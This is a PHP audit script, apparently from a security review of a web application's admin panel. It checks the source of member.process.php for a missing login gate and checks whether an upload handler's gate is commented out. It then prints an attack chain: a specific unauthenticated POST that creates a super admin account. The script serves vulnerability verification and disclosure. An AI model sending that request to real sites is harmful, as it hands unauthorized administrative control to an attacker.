<?php
// Prove admin/member.process.php has no authentication gate.
// It is the file that CREATES admin accounts with an arbitrary role code.
error_reporting(E_ALL);
ini_set('display_errors', '1');

$src = file_get_contents(__DIR__ . '/../admin/member.process.php');
$loginSrc = file_get_contents(__DIR__ . '/../admin/login.process.php');
$uploadSrc = file_get_contents(__DIR__ . '/../admin/upload_project.process.php');

$checks = [
    ['member.process.php requires Usersession.php', str_contains($src, "Usersession.php")],
    ['member.process.php CALLS getSession()',      str_contains($src, 'getSession()')],
    ['member.process.php calls gotohome()',        str_contains($src, 'gotohome()')],
    ['member.process.php reads member_role',       str_contains($src, "member_role")],
    ['member.process.php hashes before insert',    str_contains($src, 'password_hash') || str_contains($src, 'insertMember')],
    ['upload_project gate is ACTIVE',              preg_match('/if\s*\(!\$login\)\s*\{\s*\$util->gotohome\(\);/s', $uploadSrc) === 1],
    ['upload_project gate is commented out',       preg_match('/if\s*\(!\$login\)\s*\{\s*\/\/\s*\$util->gotohome\(\);/s', $uploadSrc) === 1],
];

foreach ($checks as [$label, $pass]) {
    printf("%-45s %s\n", $label, $pass ? 'YES' : 'no');
}

echo "\nRole codes from install/schema.sql seed:\n";
echo "  1 = super admin   2 = admin   3 = bendahari   4 = sijil   5 = ajk\n\n";

echo "Attack chain:\n";
echo "  POST /admin/member.process.php\n";
echo "       member_name=attacker&member_password=pwned123\n";
echo "       &member_role=1&member_email=attacker@example.com&add_j=1\n";
echo "  -> insertMember() runs password_hash() and INSERTs with member_level=1\n";
echo "  -> no session, no CSRF token, no role check on the caller\n";
echo "  -> attacker now holds a super admin account\n";
